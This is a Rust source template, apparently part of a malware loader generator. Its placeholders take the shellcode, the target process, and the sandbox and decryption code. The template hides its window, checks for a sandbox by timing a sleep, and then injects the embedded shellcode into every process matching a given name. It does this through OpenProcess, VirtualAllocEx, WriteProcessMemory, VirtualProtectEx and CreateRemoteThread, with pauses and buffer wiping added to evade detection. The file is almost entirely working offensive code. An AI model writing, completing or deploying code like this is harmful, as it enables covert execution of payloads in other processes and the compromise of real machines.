#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

{{LITCRYPT_SETUP}}
{{COMMON_MODULE}}

use ntapi::ntexapi::{NtQuerySystemInformation, SystemProcessInformation};
use ntapi::winapi::ctypes::c_void;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::VirtualAllocEx;
use windows::Win32::System::Memory::VirtualProtectEx;
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
use windows::Win32::System::Threading::CreateRemoteThread;
use windows::Win32::System::Threading::OpenProcess;
use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
use std::include_bytes;
use std::time::{Duration, Instant};
use std::thread;

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn find_process_ids_by_name(tar: &str) -> Vec<usize> {
    common::find_process_ids_by_name(tar, |buffer, len| unsafe {
        NtQuerySystemInformation(
            SystemProcessInformation,
            buffer as *mut c_void,
            len as u32,
            std::ptr::null_mut(),
        )
    })
}

fn pause(ms: u64) {
    thread::sleep(Duration::from_millis(ms));
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}


fn inject_shellcode(mut buf: Vec<u8>, tar: usize) {
    unsafe {
        let h_process = match OpenProcess(PROCESS_ALL_ACCESS, false, tar as u32) {
            Ok(h) => h,
            Err(_) => return,
        };

        pause(150);

        let buf_len = buf.len();
        let result_ptr = VirtualAllocEx(h_process, None, buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        pause(200);

        let mut byteswritten = 0;
        let _ = WriteProcessMemory(
            h_process,
            result_ptr,
            buf.as_ptr() as _,
            buf_len,
            Some(&mut byteswritten),
        );

        common::wipe(&mut buf);
        pause(150);

        let mut old_perms = PAGE_READWRITE;
        let _ = VirtualProtectEx(
            h_process,
            result_ptr,
            buf_len,
            PAGE_EXECUTE_READ,
            &mut old_perms,
        );

        pause(100);

        let _ = CreateRemoteThread(
            h_process,
            None,
            0,
            Some(std::mem::transmute(result_ptr)),
            None,
            0,
            None,
        );
    }
}

fn main() {
    {{SANDBOX}}

    if !check_environment() { return; }

    let tar = {{TARGET_PROCESS}};

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    let list: Vec<usize> = find_process_ids_by_name(&tar);
    if !list.is_empty() {
        for i in &list {
            inject_shellcode(vec.clone(), *i);
        }
    }
}

{{DLL_MAIN}}
